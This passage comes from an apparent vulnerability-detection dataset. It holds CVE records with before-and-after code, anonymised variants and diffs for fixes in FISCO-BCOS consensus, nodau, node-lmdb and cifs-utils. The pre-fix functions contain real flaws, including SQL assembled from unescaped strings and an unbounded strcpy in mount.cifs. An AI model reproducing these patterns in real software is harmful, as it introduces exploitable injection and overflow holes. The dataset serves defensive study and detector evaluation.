auto VAR_9 = VAR_5->getConsensusNodeByIndex(VAR_8);
if (!VAR_9)
{
continue;
}
VAR_0 += VAR_9->weight();
}
}
if (VAR_0 < (VAR_5->maxFaultyQuorum() + 1))
{
return 0;
}
if (VAR_5->toView() >= VAR_1)
{
return 0;
}
if (VAR_1 > 0)
{
VAR_5->setToView(VAR_1 - 1);
}
PBFT_LOG(VAR_10) << LOG_DESC(""tryToTriggerFastViewChange"") << LOG_KV(""viewToReach"", VAR_1)
<< VAR_5->printCurrentState();
return VAR_1;
}",FISCO-BCOS/d2fe66054753d65bbe7f88b0a1fc1fab4b716d0e/PBFTCacheProcessor.cpp/vul/before/0.json,"ViewType PBFTCacheProcessor::tryToTriggerFastViewChange()
{
    uint64_t greaterViewWeight = 0;
    ViewType viewToReach = 0;
    bool findViewToReach = false;
    for (auto const& it : m_viewChangeCache)
    {
        auto view = it.first;
        if (view <= m_config->toView())
        {
            continue;
        }
        if (viewToReach > view || (viewToReach == 0))
        {
            // check the quorum
            auto viewChangeCache = it.second;
            greaterViewWeight = 0;
            for (auto const& cache : viewChangeCache)
            {
                auto fromIdx = cache.first;
                auto nodeInfo = m_config->getConsensusNodeByIndex(fromIdx);
                if (!nodeInfo)
                {
                    continue;
                }
                greaterViewWeight += nodeInfo->weight();
            }
            // must ensure at least (f+1) nodes at the same view can trigger fast-viewchange
            if (greaterViewWeight >= (m_config->maxFaultyQuorum() + 1))
            {
                findViewToReach = true;
                viewToReach = view;
            }
        }
    }
    if (!findViewToReach)
    {
        return 0;
    }
    if (m_config->toView() >= viewToReach)
    {
        return 0;
    }
    if (viewToReach > 0)
    {
        // set toView to (viewToReach - 1) and then trigger timeout to increase toView to
        // viewToReach
        m_config->setToView(viewToReach - 1);
    }
    PBFT_LOG(INFO) << LOG_DESC(""tryToTriggerFastViewChange"") << LOG_KV(""viewToReach"", viewToReach)
                   << m_config->printCurrentState();
    return viewToReach;
}","ViewType PBFTCacheProcessor::tryToTriggerFastViewChange()
{
    uint64_t VAR_0 = 0;
    ViewType VAR_1 = 0;
    bool VAR_2 = false;
    for (auto const& VAR_3 : VAR_4)
    {
        auto VAR_5 = VAR_3.first;
        if (VAR_5 <= VAR_6->toView())
        {
            continue;
        }
        if (VAR_1 > VAR_5 || (VAR_1 == 0))
        {
            /* COMMENT_0 */
            auto VAR_7 = VAR_3.second;
            VAR_0 = 0;
            for (auto const& VAR_8 : VAR_7)
            {
                auto VAR_9 = VAR_8.first;
                auto VAR_10 = VAR_6->getConsensusNodeByIndex(VAR_9);
                if (!VAR_10)
                {
                    continue;
                }
                VAR_0 += VAR_10->weight();
            }
            /* COMMENT_1 */
            if (VAR_0 >= (VAR_6->maxFaultyQuorum() + 1))
            {
                VAR_2 = true;
                VAR_1 = VAR_5;
            }
        }
    }
    if (!VAR_2)
    {
        return 0;
    }
    if (VAR_6->toView() >= VAR_1)
    {
        return 0;
    }
    if (VAR_1 > 0)
    {
        /* COMMENT_2 */
        /* COMMENT_3 */
        VAR_6->setToView(VAR_1 - 1);
    }
    PBFT_LOG(VAR_11) << LOG_DESC(""tryToTriggerFastViewChange"") << LOG_KV(""viewToReach"", VAR_1)
                   << VAR_6->printCurrentState();
    return VAR_1;
}",FISCO-BCOS/d2fe66054753d65bbe7f88b0a1fc1fab4b716d0e/PBFTCacheProcessor.cpp/vul/after/0.json,"--- func_before
+++ func_after
@@ -2,6 +2,7 @@
 {
     uint64_t greaterViewWeight = 0;
     ViewType viewToReach = 0;
+    bool findViewToReach = false;
     for (auto const& it : m_viewChangeCache)
     {
         auto view = it.first;
@@ -9,28 +10,30 @@
         {
             continue;
         }
-        if (viewToReach == 0)
+        if (viewToReach > view || (viewToReach == 0))
         {
-            viewToReach = view;
-        }
-        if (viewToReach > view)
-        {
-            viewToReach = view;
-        }
-        // check the quorum
-        auto viewChangeCache = it.second;
-        for (auto const& cache : viewChangeCache)
-        {
-            auto fromIdx = cache.first;
-            auto nodeInfo = m_config->getConsensusNodeByIndex(fromIdx);
-            if (!nodeInfo)
+            // check the quorum
+            auto viewChangeCache = it.second;
+            greaterViewWeight = 0;
+            for (auto const& cache : viewChangeCache)
             {
-                continue;
+                auto fromIdx = cache.first;
+                auto nodeInfo = m_config->getConsensusNodeByIndex(fromIdx);
+                if (!nodeInfo)
+                {
+                    continue;
+                }
+                greaterViewWeight += nodeInfo->weight();
             }
-            greaterViewWeight += nodeInfo->weight();
+            // must ensure at least (f+1) nodes at the same view can trigger fast-viewchange
+            if (greaterViewWeight >= (m_config->maxFaultyQuorum() + 1))
+            {
+                findViewToReach = true;
+                viewToReach = view;
+            }
         }
     }
-    if (greaterViewWeight < (m_config->maxFaultyQuorum() + 1))
+    if (!findViewToReach)
     {
         return 0;
     }","{'deleted_lines': ['        if (viewToReach == 0)', '            viewToReach = view;', '        }', '        if (viewToReach > view)', '        {', '            viewToReach = view;', '        }', '        // check the quorum', '        auto viewChangeCache = it.second;', '        for (auto const& cache : viewChangeCache)', '        {', '            auto fromIdx = cache.first;', '            auto nodeInfo = m_config->getConsensusNodeByIndex(fromIdx);', '            if (!nodeInfo)', '                continue;', '            greaterViewWeight += nodeInfo->weight();', '    if (greaterViewWeight < (m_config->maxFaultyQuorum() + 1))'], 'added_lines': ['    bool findViewToReach = false;', '        if (viewToReach > view || (viewToReach == 0))', '            // check the quorum', '            auto viewChangeCache = it.second;', '            greaterViewWeight = 0;', '            for (auto const& cache : viewChangeCache)', '                auto fromIdx = cache.first;', '                auto nodeInfo = m_config->getConsensusNodeByIndex(fromIdx);', '                if (!nodeInfo)', '                {', '                    continue;', '                }', '                greaterViewWeight += nodeInfo->weight();', '            // must ensure at least (f+1) nodes at the same view can trigger fast-viewchange', '            if (greaterViewWeight >= (m_config->maxFaultyQuorum() + 1))', '            {', '                findViewToReach = true;', '                viewToReach = view;', '            }', '    if (!findViewToReach)']}",True,"FISCO-BCOS release-3.0.0-rc2 was discovered to contain an issue where a malicious node, via a malicious viewchange packet, will cause normal nodes to change view excessively and stop generating blocks.",7.5,HIGH,2,valid,2022-03-01T11:09:35Z,4
CVE-2022-4399,['CWE-89'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,TicklishHoneyBee/nodau,"Use parametetrized SQL statement

Move to parametetrized SQL statement allows using chars like ""'"" in
notes and also avoid sql injection",7a7d737a3929f335b9717ddbd31db91151b69ad2,https://github.com/TicklishHoneyBee/nodau/commit/7a7d737a3929f335b9717ddbd31db91151b69ad2,src/edit.c,edit_ext,"static int edit_ext(char* editor, char* name, char* date, char* data)
{
int fd;
int st;
int sz;
char* b;
char* l;
char buff[512];
pid_t pid;
strcpy(buff,""/tmp/nodau.XXXXXX"");
fd = mkstemp(buff);
if (fd < 0)
return 1;
pid = fork();
if (pid < 0) {
return 1;
}else if (pid) {
close(fd);
waitpid(pid,&st,0);
if (!st) {
if ((fd = open(buff,O_RDONLY)) < 0)
return 1;
sz = lseek(fd,0,SEEK_END);
lseek(fd,0,SEEK_SET);
if (sz) {
b = alloca(sz+1);
if (sz != read(fd,b,sz))
return 1;
close(fd);
remove(buff);
b[sz] = 0;
l = strstr(b,""-----"");
if (l) {
l += 6;
if (db_update(name,l))
return 1;
printf(""%s saved\n"",name);
}
}
}
return st;
}
sz = strlen(name)+strlen(date)+strlen(data)+50;
b = alloca(sz);
sz = sprintf(
b,
""%s (%s)\nText above this line is ignored\n-----\n%s"",
name,
date,
data
);
if (write(fd,b,sz) != sz) {
exit(1);
}
fsync(fd);
close(fd);
st = execl(editor,editor,buff,(char*)NULL);
exit(st);
return 1;
}","static int edit_ext(char* VAR_0, char* VAR_1, char* VAR_2, char* VAR_3)
{
int VAR_4;
int VAR_5;
int VAR_6;
char* VAR_7;
char* VAR_8;
char VAR_9[512];
pid_t VAR_10;
strcpy(VAR_9,""/tmp/nodau.XXXXXX"");
VAR_4 = mkstemp(VAR_9);
if (VAR_4 < 0)
return 1;
VAR_10 = fork();
if (VAR_10 < 0) {
return 1;
}else if (VAR_10) {
close(VAR_4);
waitpid(VAR_10,&VAR_5,0);
if (!VAR_5) {
if ((VAR_4 = open(VAR_9,VAR_11)) < 0)
return 1;
VAR_6 = lseek(VAR_4,0,VAR_12);
lseek(VAR_4,0,VAR_13);
if (VAR_6) {
VAR_7 = alloca(VAR_6+1);
if (VAR_6 != read(VAR_4,VAR_7,VAR_6))
return 1;
close(VAR_4);
remove(VAR_9);
VAR_7[VAR_6] = 0;
VAR_8 = strstr(VAR_7,""-----"");
if (VAR_8) {
VAR_8 += 6;
if (db_update(VAR_1,VAR_8))
return 1;
printf(""%s saved\n"",VAR_1);
}
}
}
return VAR_5;
}
VAR_6 = strlen(VAR_1)+strlen(VAR_2)+strlen(VAR_3)+50;
VAR_7 = alloca(VAR_6);
VAR_6 = sprintf(
VAR_7,
""%s (%s)\nText above this line is ignored\n-----\n%s"",
VAR_1,
VAR_2,
VAR_3
);
if (write(VAR_4,VAR_7,VAR_6) != VAR_6) {
exit(1);
}
fsync(VAR_4);
close(VAR_4);
VAR_5 = execl(VAR_0,VAR_0,VAR_9,(char*)NULL);
exit(VAR_5);
return 1;
}",TicklishHoneyBee/nodau/7a7d737a3929f335b9717ddbd31db91151b69ad2/edit.c/vul/before/0.json,"static int edit_ext(char* editor, char* name, char* date, char* data)
{
	int fd;
	int st;
	int sz;
	char* b;
	char* l;
	char buff[512];
	pid_t pid;

	strcpy(buff,""/tmp/nodau.XXXXXX"");
	fd = mkstemp(buff);

	if (fd < 0)
		return 1;

	pid = fork();

	if (pid < 0) {
		return 1;
	}else if (pid) {
		close(fd);
		waitpid(pid,&st,0);
		if (!st) {
			if ((fd = open(buff,O_RDONLY)) < 0)
				return 1;
			/* find the file length */
			sz = lseek(fd,0,SEEK_END);
			lseek(fd,0,SEEK_SET);
			if (sz) {
				/* load the note into memory */
				b = alloca(sz+1);
				if (sz != read(fd,b,sz))
					return 1;
				close(fd);
				/* delete the file */
				remove(buff);
				b[sz] = 0;
				/* find the note data */
				l = strstr(b,""-----"");
				if (l) {
					/* save the note */
					l += 6;
					int r = db_update(name,l);
					if (r != SQLITE_DONE && r != SQLITE_OK)
						return 1;

					/* let the user know */
					printf(""%s saved\n"",name);
				}
			}
		}
		return st;
	}

	sz = strlen(name)+strlen(date)+strlen(data)+50;
	b = alloca(sz);

	/* insert data into file */
	sz = sprintf(
		b,
		""%s (%s)\nText above this line is ignored\n-----\n%s"",
		name,
		date,
		data
	);
	if (write(fd,b,sz) != sz) {
		exit(1);
	}
	fsync(fd);
	close(fd);

	st = execl(editor,editor,buff,(char*)NULL);

	/* we should only ever get here if something goes wrong with exec */
	exit(st);

	/* and we shouldn't ever get here, but it stops the compiler complaining */
	return 1;
}","static int edit_ext(char* VAR_0, char* VAR_1, char* VAR_2, char* VAR_3)
{
	int VAR_4;
	int VAR_5;
	int VAR_6;
	char* VAR_7;
	char* VAR_8;
	char VAR_9[512];
	pid_t VAR_10;

	strcpy(VAR_9,""/tmp/nodau.XXXXXX"");
	VAR_4 = mkstemp(VAR_9);

	if (VAR_4 < 0)
		return 1;

	VAR_10 = fork();

	if (VAR_10 < 0) {
		return 1;
	}else if (VAR_10) {
		close(VAR_4);
		waitpid(VAR_10,&VAR_5,0);
		if (!VAR_5) {
			if ((VAR_4 = open(VAR_9,VAR_11)) < 0)
				return 1;
			/* COMMENT_0 */
			VAR_6 = lseek(VAR_4,0,VAR_12);
			lseek(VAR_4,0,VAR_13);
			if (VAR_6) {
				/* COMMENT_1 */
				VAR_7 = alloca(VAR_6+1);
				if (VAR_6 != read(VAR_4,VAR_7,VAR_6))
					return 1;
				close(VAR_4);
				/* COMMENT_2 */
				remove(VAR_9);
				VAR_7[VAR_6] = 0;
				/* COMMENT_3 */
				VAR_8 = strstr(VAR_7,""-----"");
				if (VAR_8) {
					/* COMMENT_4 */
					VAR_8 += 6;
					int VAR_14 = db_update(VAR_1,VAR_8);
					if (VAR_14 != VAR_15 && VAR_14 != VAR_16)
						return 1;

					/* COMMENT_5 */
					printf(""%s saved\n"",VAR_1);
				}
			}
		}
		return VAR_5;
	}

	VAR_6 = strlen(VAR_1)+strlen(VAR_2)+strlen(VAR_3)+50;
	VAR_7 = alloca(VAR_6);

	/* COMMENT_6 */
	VAR_6 = sprintf(
		VAR_7,
		""%s (%s)\nText above this line is ignored\n-----\n%s"",
		VAR_1,
		VAR_2,
		VAR_3
	);
	if (write(VAR_4,VAR_7,VAR_6) != VAR_6) {
		exit(1);
	}
	fsync(VAR_4);
	close(VAR_4);

	VAR_5 = execl(VAR_0,VAR_0,VAR_9,(char*)NULL);

	/* COMMENT_7 */
	exit(VAR_5);

	/* COMMENT_8 */
	return 1;
}",TicklishHoneyBee/nodau/7a7d737a3929f335b9717ddbd31db91151b69ad2/edit.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -41,7 +41,8 @@
 				if (l) {
 					/* save the note */
 					l += 6;
-					if (db_update(name,l))
+					int r = db_update(name,l);
+					if (r != SQLITE_DONE && r != SQLITE_OK)
 						return 1;
 
 					/* let the user know */","{'deleted_lines': ['\t\t\t\t\tif (db_update(name,l))'], 'added_lines': ['\t\t\t\t\tint r = db_update(name,l);', '\t\t\t\t\tif (r != SQLITE_DONE && r != SQLITE_OK)']}",True,A vulnerability was found in TicklishHoneyBee nodau. It has been rated as critical. Affected by this issue is some unknown functionality of the file src/db.c. The manipulation of the argument value/name leads to sql injection. The name of the patch is 7a7d737a3929f335b9717ddbd31db91151b69ad2. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-215252.,9.8,CRITICAL,3,valid,2022-03-03T12:02:37Z,4
CVE-2022-4399,['CWE-89'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,TicklishHoneyBee/nodau,"Use parametetrized SQL statement

Move to parametetrized SQL statement allows using chars like ""'"" in
notes and also avoid sql injection",7a7d737a3929f335b9717ddbd31db91151b69ad2,https://github.com/TicklishHoneyBee/nodau/commit/7a7d737a3929f335b9717ddbd31db91151b69ad2,src/db.c,db_update,"int db_update(char* name, char* value)
{
char* sql;
int r = 0;
if (crypt_key) {
value = note_encrypt(value,crypt_key);
r = asprintf(&sql, ""UPDATE nodau set text='%s' , encrypted='true' WHERE name='%s'"", value, name);
free(value);
if (r < 0)
return 1;
}else{
if (asprintf(&sql, ""UPDATE nodau set text='%s' , encrypted='false' WHERE name='%s'"", value, name) < 0)
return 1;
}
r = sqlite3_exec(db_data.db, sql, NULL, 0, &db_data.error_msg);
free(sql);
return r;
}","int db_update(char* VAR_0, char* VAR_1)
{
char* VAR_2;
int VAR_3 = 0;
if (VAR_4) {
VAR_1 = note_encrypt(VAR_1,VAR_4);
VAR_3 = asprintf(&VAR_2, ""UPDATE nodau set text='%s' , encrypted='true' WHERE name='%s'"", VAR_1, VAR_0);
free(VAR_1);
if (VAR_3 < 0)
return 1;
}else{
if (asprintf(&VAR_2, ""UPDATE nodau set text='%s' , encrypted='false' WHERE name='%s'"", VAR_1, VAR_0) < 0)
return 1;
}
VAR_3 = sqlite3_exec(VAR_5.db, VAR_2, NULL, 0, &VAR_5.error_msg);
free(VAR_2);
return VAR_3;
}",TicklishHoneyBee/nodau/7a7d737a3929f335b9717ddbd31db91151b69ad2/db.c/vul/before/0.json,"int db_update(char* name, char* value)
{
	char* sql;
	int r = 0;
	/* create the sql statement using the name/text for this note
	 * if it's meant to be encrypted, then crypt_key will be set */
	if (crypt_key) {
		value = note_encrypt(value,crypt_key);
		if (asprintf(&sql, ""UPDATE nodau set text=?, encrypted='true' WHERE name=?"") < 0)
			return 1;
	}else{
		if (asprintf(&sql, ""UPDATE nodau set text=?, encrypted='false' WHERE name=?"") < 0)
			return 1;
	}

	sqlite3_stmt *compiled_statement;
	r = sqlite3_prepare_v2(db_data.db, sql, -1, &compiled_statement, NULL);
	if (r != SQLITE_OK)
		return 1;

	r= sqlite3_bind_text(compiled_statement, 1, value, -1, NULL);
	r= sqlite3_bind_text(compiled_statement, 2, name, -1, NULL);
	if (r != SQLITE_OK)
		return 1;

	/* do it */
	r = sqlite3_step(compiled_statement);
	if (r != SQLITE_DONE) {
		fprintf(stderr, ""Error #%d: %s\n"", r, db_err());
		return 1;
	}
	r = sqlite3_finalize(compiled_statement);
	if (r != SQLITE_OK)
		fprintf(stderr, ""Error #%d: %s\n"", r, db_err());

	free(sql);
	if (crypt_key)
		free(value);
	return r;
}","int db_update(char* VAR_0, char* VAR_1)
{
	char* VAR_2;
	int VAR_3 = 0;
	/* COMMENT_0 */
                                                                
	if (VAR_4) {
		VAR_1 = note_encrypt(VAR_1,VAR_4);
		if (asprintf(&VAR_2, ""UPDATE nodau set text=?, encrypted='true' WHERE name=?"") < 0)
			return 1;
	}else{
		if (asprintf(&VAR_2, ""UPDATE nodau set text=?, encrypted='false' WHERE name=?"") < 0)
			return 1;
	}

	sqlite3_stmt *VAR_5;
	VAR_3 = sqlite3_prepare_v2(VAR_6.db, VAR_2, -1, &VAR_5, NULL);
	if (VAR_3 != VAR_7)
		return 1;

	VAR_3= sqlite3_bind_text(VAR_5, 1, VAR_1, -1, NULL);
	VAR_3= sqlite3_bind_text(VAR_5, 2, VAR_0, -1, NULL);
	if (VAR_3 != VAR_7)
		return 1;

	/* COMMENT_2 */
	VAR_3 = sqlite3_step(VAR_5);
	if (VAR_3 != VAR_8) {
		fprintf(VAR_9, ""Error #%d: %s\n"", VAR_3, db_err());
		return 1;
	}
	VAR_3 = sqlite3_finalize(VAR_5);
	if (VAR_3 != VAR_7)
		fprintf(VAR_9, ""Error #%d: %s\n"", VAR_3, db_err());

	free(VAR_2);
	if (VAR_4)
		free(VAR_1);
	return VAR_3;
}",TicklishHoneyBee/nodau/7a7d737a3929f335b9717ddbd31db91151b69ad2/db.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -6,17 +6,35 @@
 	 * if it's meant to be encrypted, then crypt_key will be set */
 	if (crypt_key) {
 		value = note_encrypt(value,crypt_key);
-		r = asprintf(&sql, ""UPDATE nodau set text='%s' , encrypted='true' WHERE name='%s'"", value, name);
-		free(value);
-		if (r < 0)
+		if (asprintf(&sql, ""UPDATE nodau set text=?, encrypted='true' WHERE name=?"") < 0)
 			return 1;
 	}else{
-		if (asprintf(&sql, ""UPDATE nodau set text='%s' , encrypted='false' WHERE name='%s'"", value, name) < 0)
+		if (asprintf(&sql, ""UPDATE nodau set text=?, encrypted='false' WHERE name=?"") < 0)
 			return 1;
 	}
 
+	sqlite3_stmt *compiled_statement;
+	r = sqlite3_prepare_v2(db_data.db, sql, -1, &compiled_statement, NULL);
+	if (r != SQLITE_OK)
+		return 1;
+
+	r= sqlite3_bind_text(compiled_statement, 1, value, -1, NULL);
+	r= sqlite3_bind_text(compiled_statement, 2, name, -1, NULL);
+	if (r != SQLITE_OK)
+		return 1;
+
 	/* do it */
-	r = sqlite3_exec(db_data.db, sql, NULL, 0, &db_data.error_msg);
+	r = sqlite3_step(compiled_statement);
+	if (r != SQLITE_DONE) {
+		fprintf(stderr, ""Error #%d: %s\n"", r, db_err());
+		return 1;
+	}
+	r = sqlite3_finalize(compiled_statement);
+	if (r != SQLITE_OK)
+		fprintf(stderr, ""Error #%d: %s\n"", r, db_err());
+
 	free(sql);
+	if (crypt_key)
+		free(value);
 	return r;
 }","{'deleted_lines': ['\t\tr = asprintf(&sql, ""UPDATE nodau set text=\'%s\' , encrypted=\'true\' WHERE name=\'%s\'"", value, name);', '\t\tfree(value);', '\t\tif (r < 0)', '\t\tif (asprintf(&sql, ""UPDATE nodau set text=\'%s\' , encrypted=\'false\' WHERE name=\'%s\'"", value, name) < 0)', '\tr = sqlite3_exec(db_data.db, sql, NULL, 0, &db_data.error_msg);'], 'added_lines': ['\t\tif (asprintf(&sql, ""UPDATE nodau set text=?, encrypted=\'true\' WHERE name=?"") < 0)', '\t\tif (asprintf(&sql, ""UPDATE nodau set text=?, encrypted=\'false\' WHERE name=?"") < 0)', '\tsqlite3_stmt *compiled_statement;', '\tr = sqlite3_prepare_v2(db_data.db, sql, -1, &compiled_statement, NULL);', '\tif (r != SQLITE_OK)', '\t\treturn 1;', '', '\tr= sqlite3_bind_text(compiled_statement, 1, value, -1, NULL);', '\tr= sqlite3_bind_text(compiled_statement, 2, name, -1, NULL);', '\tif (r != SQLITE_OK)', '\t\treturn 1;', '', '\tr = sqlite3_step(compiled_statement);', '\tif (r != SQLITE_DONE) {', '\t\tfprintf(stderr, ""Error #%d: %s\\n"", r, db_err());', '\t\treturn 1;', '\t}', '\tr = sqlite3_finalize(compiled_statement);', '\tif (r != SQLITE_OK)', '\t\tfprintf(stderr, ""Error #%d: %s\\n"", r, db_err());', '', '\tif (crypt_key)', '\t\tfree(value);']}",True,A vulnerability was found in TicklishHoneyBee nodau. It has been rated as critical. Affected by this issue is some unknown functionality of the file src/db.c. The manipulation of the argument value/name leads to sql injection. The name of the patch is 7a7d737a3929f335b9717ddbd31db91151b69ad2. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-215252.,9.8,CRITICAL,3,valid,2022-03-03T12:02:37Z,4
CVE-2022-21164,['CWE-Other'],AV:N/AC:L/Au:N/C:N/I:N/A:P,0,Venemo/node-lmdb,Perform argument check for putString,97760104c0fd311206b88aecd91fa1f59fe2b85a,https://github.com/Venemo/node-lmdb/commit/97760104c0fd311206b88aecd91fa1f59fe2b85a,src/txn.cpp,NAN_METHOD,"NAN_METHOD(TxnWrap::putString) {
return putCommon(info, [](Nan::NAN_METHOD_ARGS_TYPE info, MDB_val &data) -> void {
CustomExternalStringResource::writeTo(Local<String>::Cast(info[2]), &data);
}, [](MDB_val &data) -> void {
delete[] (uint16_t*)data.mv_data;
});
}","NAN_METHOD(TxnWrap::putString) {
return putCommon(VAR_0, [](Nan::NAN_METHOD_ARGS_TYPE VAR_0, MDB_val &VAR_1) -> void {
CustomExternalStringResource::writeTo(Local<String>::Cast(VAR_0[2]), &VAR_1);
}, [](MDB_val &VAR_1) -> void {
delete[] (uint16_t*)VAR_1.mv_data;
});
}",,"NAN_METHOD(TxnWrap::putString) {
    if (!info[2]->IsString())
        return Nan::ThrowError(""Value must be a string."");
    return putCommon(info, [](Nan::NAN_METHOD_ARGS_TYPE info, MDB_val &data) -> void {
        CustomExternalStringResource::writeTo(Local<String>::Cast(info[2]), &data);
    }, [](MDB_val &data) -> void {
        delete[] (uint16_t*)data.mv_data;
    });
}","NAN_METHOD(TxnWrap::putString) {
    if (!VAR_0[2]->IsString())
        return Nan::ThrowError(""Value must be a string."");
    return putCommon(VAR_0, [](Nan::NAN_METHOD_ARGS_TYPE VAR_0, MDB_val &VAR_1) -> void {
        CustomExternalStringResource::writeTo(Local<String>::Cast(VAR_0[2]), &VAR_1);
    }, [](MDB_val &VAR_1) -> void {
        delete[] (uint16_t*)VAR_1.mv_data;
    });
}",,"--- func_before
+++ func_after
@@ -1,4 +1,6 @@
 NAN_METHOD(TxnWrap::putString) {
+    if (!info[2]->IsString())
+        return Nan::ThrowError(""Value must be a string."");
     return putCommon(info, [](Nan::NAN_METHOD_ARGS_TYPE info, MDB_val &data) -> void {
         CustomExternalStringResource::writeTo(Local<String>::Cast(info[2]), &data);
     }, [](MDB_val &data) -> void {","{'deleted_lines': [], 'added_lines': ['    if (!info[2]->IsString())', '        return Nan::ThrowError(""Value must be a string."");']}",True,"The package node-lmdb before 0.9.7 are vulnerable to Denial of Service (DoS) when defining a non-invokable ToString value, which will cause a crash during type check.",3.7,LOW,0,valid,2022-03-12T14:19:20Z,4
CVE-2022-27239,['CWE-787'],AV:L/AC:L/Au:N/C:C/I:C/A:C,0,piastry/cifs-utils,"CVE-2022-27239: mount.cifs: fix length check for ip option parsing

Previous check was true whatever the length of the input string was,
leading to a buffer overflow in the subsequent strcpy call.

Bug: https://bugzilla.samba.org/show_bug.cgi?id=15025

Signed-off-by: Jeffrey Bencteux <jbe@improsec.com>
Reviewed-by: David Disseldorp <ddiss@suse.de>",955fb147e97a6a74e1aaa65766de91e2c1479765,https://github.com/piastry/cifs-utils/commit/955fb147e97a6a74e1aaa65766de91e2c1479765,mount.cifs.c,parse_options,"static int
parse_options(const char *data, struct parsed_mount_info *parsed_info)
{
char *value = NULL;
char *equals = NULL;
char *next_keyword = NULL;
char *out = parsed_info->options;
unsigned long *filesys_flags = &parsed_info->flags;
int out_len = 0;
int word_len;
int rc = 0;
int got_bkupuid = 0;
int got_bkupgid = 0;
int got_uid = 0;
int got_cruid = 0;
int got_gid = 0;
int got_snapshot = 0;
uid_t uid, cruid = 0, bkupuid = 0;
gid_t gid, bkupgid = 0;
char *ep;
struct passwd *pw;
struct group *gr;
char txtbuf[22];
unsigned long long snapshot;
struct tm tm;
out[0] = '\0';
uid = getuid();
if (uid != 0)
got_uid = 1;
gid = getgid();
if (gid != 0)
got_gid = 1;
if (!data)
return EX_USAGE;
while (data && *data) {
next_keyword = strchr(data, ',');
if (next_keyword)
*next_keyword++ = 0;
value = NULL;
if ((equals = strchr(data, '=')) != NULL) {
*equals = '\0';
value = equals + 1;
}
switch(parse_opt_token(data)) {
case OPT_USERS:
if (!value || !*value) {
*filesys_flags |= MS_USERS;
goto nocopy;
}
break;
case OPT_USER:
if (!value || !*value) {
if (data[4] == '\0') {
*filesys_flags |= MS_USER;
goto nocopy;
} else {
fprintf(stderr,
""username specified with no parameter\n"");
return EX_USAGE;
}
} else {
strlcpy(parsed_info->username, value,
sizeof(parsed_info->username));
parsed_info->got_user = 1;
goto nocopy;
}
case OPT_PASS:
if (parsed_info->got_password) {
fprintf(stderr,
""password specified twice, ignoring second\n"");
goto nocopy;
}
if (!value || !*value) {
parsed_info->got_password = 1;
goto nocopy;
}
rc = set_password(parsed_info, value);
if (rc)
return rc;
goto nocopy;
case OPT_SEC:
if (value) {
if (!strncmp(value, ""none"", 4))
parsed_info->got_password = 1;
if (!strncmp(value, ""krb5"", 4)) {
parsed_info->is_krb5 = 1;
parsed_info->got_password = 1;
}
}
break;
case OPT_IP:
if (!value || !*value) {
fprintf(stderr,
""target ip address argument missing\n"");
} else if (strnlen(value, MAX_ADDRESS_LEN) <=
MAX_ADDRESS_LEN) {
strcpy(parsed_info->addrlist, value);
if (parsed_info->verboseflag)
fprintf(stderr,
""ip address %s override specified\n"",
value);
goto nocopy;
} else {
fprintf(stderr, ""ip address too long\n"");
return EX_USAGE;
}
break;
case OPT_UNC:
if (!value || !*value) {
fprintf(stderr,
""invalid path to network resource\n"");
return EX_USAGE;
}
rc = parse_unc(value, parsed_info, thisprogram);
if (rc)
return rc;
break;
case OPT_DOM:
if (!value) {
parsed_info->domain[0] = '\0';
parsed_info->got_domain = 1;
goto nocopy;
}
if (strnlen(value, sizeof(parsed_info->domain)) >=
sizeof(parsed_info->domain)) {
fprintf(stderr, ""domain name too long\n"");
return EX_USAGE;
}
strlcpy(parsed_info->domain, value,
sizeof(parsed_info->domain));
goto nocopy;
case OPT_CRED:
if (!value || !*value) {
fprintf(stderr,
""invalid credential file name specified\n"");
return EX_USAGE;
}
rc = open_cred_file(value, parsed_info);
if (rc) {
fprintf(stderr,
""error %d (%s) opening credential file %s\n"",
rc, strerror(rc), value);
return rc;
}
goto nocopy;
case OPT_UID:
if (!value || !*value)
goto nocopy;
got_uid = 1;
pw = getpwnam(value);
if (pw) {
uid = pw->pw_uid;
goto nocopy;
}
errno = 0;
uid = strtoul(value, &ep, 10);
if (errno == 0 && *ep == '\0')
goto nocopy;
fprintf(stderr, ""bad option uid=\""%s\""\n"", value);
return EX_USAGE;
case OPT_CRUID:
if (!value || !*value)
goto nocopy;
got_cruid = 1;
pw = getpwnam(value);
if (pw) {
cruid = pw->pw_uid;
goto nocopy;
}
errno = 0;
cruid = strtoul(value, &ep, 10);
if (errno == 0 && *ep == '\0')
goto nocopy;
fprintf(stderr, ""bad option: cruid=\""%s\""\n"", value);
return EX_USAGE;
case OPT_GID:
if (!value || !*value)
goto nocopy;
got_gid = 1;
gr = getgrnam(value);
if (gr) {
gid = gr->gr_gid;
goto nocopy;
}
errno = 0;
gid = strtoul(value, &ep, 10);
if (errno == 0 && *ep == '\0')
goto nocopy;
fprintf(stderr, ""bad option: gid=\""%s\""\n"", value);
return EX_USAGE;
case OPT_FMASK:
fprintf(stderr,
""WARNING: CIFS mount option 'fmask' is\
deprecated. Use 'file_mode' instead.\n"");
data = ""file_mode"";
case OPT_FILE_MODE:
if (!value || !*value) {
fprintf(stderr,
""Option '%s' requires a numerical argument\n"",
data);
return EX_USAGE;
}
if (value[0] != '0')
fprintf(stderr,
""WARNING: '%s' not expressed in octal.\n"",
data);
break;
case OPT_DMASK:
fprintf(stderr,
""WARNING: CIFS mount option 'dmask' is\
deprecated. Use 'dir_mode' instead.\n"");
data = ""dir_mode"";
case OPT_DIR_MODE:
if (!value || !*value) {
fprintf(stderr,
""Option '%s' requires a numerical argument\n"",
data);
return EX_USAGE;
}
if (value[0] != '0')
fprintf(stderr,
""WARNING: '%s' not expressed in octal.\n"",
data);
break;
case OPT_NO_SUID:
*filesys_flags |= MS_NOSUID;
goto nocopy;
case OPT_SUID:
*filesys_flags &= ~MS_NOSUID;
goto nocopy;
case OPT_NO_DEV:
*filesys_flags |= MS_NODEV;
goto nocopy;
case OPT_NO_LOCK:
*filesys_flags &= ~MS_MANDLOCK;
break;
case OPT_MAND:
*filesys_flags |= MS_MANDLOCK;
goto nocopy;
case OPT_NOMAND:
*filesys_flags &= ~MS_MANDLOCK;
goto nocopy;
case OPT_DEV:
*filesys_flags &= ~MS_NODEV;
goto nocopy;
case OPT_NO_EXEC:
*filesys_flags |= MS_NOEXEC;
goto nocopy;
case OPT_EXEC:
